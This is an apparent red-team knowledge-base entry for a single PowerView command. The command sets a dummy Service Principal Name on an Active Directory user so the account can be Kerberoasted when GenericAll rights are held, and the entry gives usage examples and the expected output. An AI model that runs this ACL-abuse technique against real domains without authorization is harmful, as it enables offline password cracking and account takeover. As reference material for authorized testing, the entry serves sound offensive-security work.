---
type: command
executor: powershell
data: 'Set-DomainObject $_TARGET_USER -Set @{serviceprincipalname=''$_SPN_VALUE''}'
output: null
platforms:
  - Windows
tags:
  - active-directory
  - acl-abuse
  - kerberoasting
verified: true
validated: true
---

# powerview-set-domainobject-set-spn

## Command

```powershell
Set-DomainObject $_TARGET_USER -Set @{serviceprincipalname='$_SPN_VALUE'}
```

## Description

Modifies a domain object to set a Service Principal Name (SPN) on a user account, enabling targeted Kerberoasting when GenericAll permissions are available.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Set | Hashtable of properties to set (serviceprincipalname key) | Yes |
| $_TARGET_USER | Target username | Yes |
| $_SPN_VALUE | Dummy SPN value (e.g., ops/whatever1) | Yes |

## Examples

### Basic Usage

```powershell
Set-DomainObject targetuser -Set @{serviceprincipalname='ops/whatever1'}
```

### PowerView v3 Variant

```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

## Expected Output

Set-DomainObject function completed.

## Related

- [[procedures/Active-Directory-ACL-Abuse-via-Kerberoasting-and-AS-REP-Roasting]]
- [[tools/PowerView]]
